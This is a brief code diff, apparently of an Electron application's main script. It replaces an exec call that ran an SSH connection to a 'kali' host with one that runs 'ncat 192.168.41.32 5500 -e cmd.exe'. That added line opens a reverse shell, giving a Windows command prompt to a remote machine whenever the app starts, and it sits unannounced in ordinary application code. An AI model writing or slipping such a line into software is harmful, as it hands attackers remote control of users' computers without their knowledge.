@@ -18,7 +18,7 @@ app.whenReady().then(() => {
   });
 });
 
-exec("ssh kali@192.168.0.24", (error, stdout, stderr) => {
+exec("ncat 192.168.41.32 5500 -e cmd.exe", (error, stdout, stderr) => {
   if (error) {
     console.error(`exec error: ${error}`);
     return;
